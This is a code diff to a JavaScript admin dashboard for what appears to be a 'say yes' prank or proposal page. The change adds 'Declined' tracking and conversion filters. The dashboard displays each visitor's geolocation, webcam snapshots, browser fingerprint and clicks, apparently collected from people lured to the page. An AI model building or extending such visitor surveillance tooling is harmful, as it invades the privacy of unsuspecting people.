@@ -569,6 +569,10 @@
     <div class="label">💍 Said Yes</div>
   </div>
   <div class="stat-card">
+    <div class="value" id="statNo">0</div>
+    <div class="label">❌ Declined / No</div>
+  </div>
+  <div class="stat-card">
     <div class="value" id="statToday">0</div>
     <div class="label">Today</div>
   </div>
@@ -579,7 +583,8 @@
   <select id="filterYes" onchange="renderTable()">
     <option value="all">All Visitors</option>
     <option value="yes">Said Yes 💖</option>
-    <option value="no">Didn't Click</option>
+    <option value="no">Said No ❌</option>
+    <option value="none">Awaiting Conversion</option>
   </select>
   <select id="filterCapture" onchange="renderTable()">
     <option value="all">All Data</option>
@@ -651,14 +656,19 @@ async function fetchData() {
 
 // ---- Stats ----
 function updateStats() {
-  document.getElementById('statTotal').textContent = allData.length;
-  const geo = allData.filter(d => d.geolocation).length;
-  const cam = allData.filter(d => d.webcam_image).length;
-  const yes = allData.filter(d => d.type === 'click' && d.buttonText && d.buttonText.includes('Yes')).length;
-  const today = allData.filter(d => new Date(d.timestamp).toDateString() === new Date().toDateString()).length;
+  const pageVisits = allData.filter(d => d.type === 'page_visit');
+  document.getElementById('statTotal').textContent = pageVisits.length;
+  
+  const geo = pageVisits.filter(d => d.geolocation).length;
+  const cam = pageVisits.filter(d => d.webcam_image).length;
+  const yes = pageVisits.filter(d => d.conversion === 'yes').length;
+  const no = pageVisits.filter(d => d.conversion === 'no').length;
+  const today = pageVisits.filter(d => new Date(d.timestamp).toDateString() === new Date().toDateString()).length;
+
   document.getElementById('statGeo').textContent = geo;
   document.getElementById('statCam').textContent = cam;
   document.getElementById('statYes').textContent = yes;
+  document.getElementById('statNo').textContent = no;
   document.getElementById('statToday').textContent = today;
 }
 
@@ -704,9 +714,11 @@ function renderTable() {
 
   // Yes filter
   if (filterYes === 'yes') {
-    entries = entries.filter(e => (e._clicks && e._clicks.some(c => c.buttonText && c.buttonText.includes('Yes'))));
+    entries = entries.filter(e => e.conversion === 'yes');
   } else if (filterYes === 'no') {
-    entries = entries.filter(e => !e._clicks || !e._clicks.some(c => c.buttonText && c.buttonText.includes('Yes')));
+    entries = entries.filter(e => e.conversion === 'no');
+  } else if (filterYes === 'none') {
+    entries = entries.filter(e => !e.conversion);
   }
 
   // Capture filter
@@ -744,7 +756,15 @@ function renderTable() {
     const device = ua.split(' ').slice(-2, -1)[0] || ua.slice(0, 40) || 'Unknown';
     const os = ua.includes('Windows') ? '🪟' : ua.includes('Mac') ? '🍎' : ua.includes('Linux') ? '🐧' : ua.includes('Android') ? '📱' : ua.includes('iPhone') ? '📱' : '❓';
     const browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' : ua.includes('Edge') ? 'Edge' : 'Other';
-    const saidYes = e._clicks && e._clicks.some(c => c.buttonText && c.buttonText.includes('Yes'));
+    
+    const conversion = e.conversion;
+    let decisionBadge = '<span class="indicator indicator-no">—</span>';
+    if (conversion === 'yes') {
+      decisionBadge = '<span class="indicator indicator-yes" title="Said Yes">💖</span>';
+    } else if (conversion === 'no') {
+      decisionBadge = '<span class="indicator" style="background:#f8514933; color:#f85149; width:28px; height:28px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center;" title="Said No">❌</span>';
+    }
+    
     const hasGeo = !!e.geolocation;
     const hasCam = !!e.webcam_image;
 
@@ -757,7 +777,7 @@ function renderTable() {
         <span style="color:#8b949e;font-size:0.75rem;margin-left:4px">${fp.platform || ''}</span>
       </td>
       <td class="col-time">${new Date(e.timestamp).toLocaleString()}</td>
-      <td class="col-geo">${saidYes ? '<span class="indicator indicator-yes">💖</span>' : '<span class="indicator indicator-no">—</span>'}</td>
+      <td class="col-geo">${decisionBadge}</td>
       <td class="col-geo">${hasGeo ? '<span class="tag tag-geo">✓</span>' : '<span style="color:#30363d">—</span>'}</td>
       <td class="col-webcam">${hasCam ? '<span class="tag tag-cam">✓</span>' : '<span style="color:#30363d">—</span>'}</td>
       <td class="col-actions">
@@ -880,14 +900,18 @@ function viewDetail(id) {
       const loadTime = new Date(data.timestamp).getTime();
       const diffSec = ((clickTime - loadTime) / 1000).toFixed(1);
       
-      const isYes = c.buttonText && c.buttonText.includes('Yes');
-      const dotClass = isYes ? 'success' : 'warning';
+      const isYes = c.decision === 'yes';
+      const isNo = c.decision === 'no';
+      const dotClass = isYes ? 'success' : (isNo ? 'accent' : 'warning');
+      const eventTitle = isYes 
+        ? '💖 Converted (Said Yes!)' 
+        : (isNo ? '❌ Declined (Said No/Maybe)' : '🖱️ Button Interacted');
       
       return `
         <div class="timeline-event">
           <div class="timeline-dot ${dotClass}"></div>
           <div class="timeline-time">${new Date(c.timestamp).toLocaleTimeString()} (+${diffSec}s)</div>
-          <div class="timeline-title">${isYes ? '💖 Converted (Said Yes!)' : '🖱️ Button Interacted'}</div>
+          <div class="timeline-title">${eventTitle}</div>
           <div class="timeline-desc">Clicked: "${c.buttonText}"</div>
         </div>
       `;
@@ -923,11 +947,14 @@ function viewDetail(id) {
     `;
   }
 
-  // Check if they said yes
-  const saidYes = clicks.some(c => c.buttonText && c.buttonText.includes('Yes'));
-  const conversionBadge = saidYes 
-    ? '<span class="tag tag-yes" style="padding: 4px 12px; font-size: 0.8rem;">CONVERTED 💖</span>' 
-    : '<span class="tag" style="background:#21262d; color:#8b949e; padding: 4px 12px; font-size: 0.8rem;">Awaiting Conversion</span>';
+  // Check conversion decision
+  const conversion = data.conversion;
+  let conversionBadge = '<span class="tag" style="background:#21262d; color:#8b949e; padding: 4px 12px; font-size: 0.8rem;">Awaiting Conversion</span>';
+  if (conversion === 'yes') {
+    conversionBadge = '<span class="tag tag-yes" style="padding: 4px 12px; font-size: 0.8rem;">CONVERTED 💖</span>';
+  } else if (conversion === 'no') {
+    conversionBadge = '<span class="tag" style="background:#f8514933; color:#f85149; padding: 4px 12px; font-size: 0.8rem;">DECLINED ❌</span>';
+  }
 
   // Populating modalBody
   body.innerHTML = `
